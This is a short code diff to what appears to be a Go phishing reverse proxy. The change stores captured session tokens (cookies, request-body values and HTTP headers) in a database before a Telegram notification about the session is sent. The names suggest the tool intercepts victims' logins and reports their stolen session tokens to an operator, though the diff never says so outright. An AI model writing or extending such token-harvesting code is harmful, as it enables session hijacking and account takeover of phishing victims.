@@ -892,6 +892,23 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							
 							if shouldNotify {
 								if s, ok := p.sessions[sid]; ok {
+									// Persist tokens to DB to ensure consistency with Telegram notification
+									if len(s.CookieTokens) > 0 {
+										if err := p.db.SetSessionCookieTokens(sid, s.CookieTokens); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
+									if len(s.BodyTokens) > 0 {
+										if err := p.db.SetSessionBodyTokens(sid, s.BodyTokens); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
+									if len(s.HttpTokens) > 0 {
+										if err := p.db.SetSessionHttpTokens(sid, s.HttpTokens); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
+
 									SendTelegramNotification(p.cfg, s, pl)
 								}
 							}
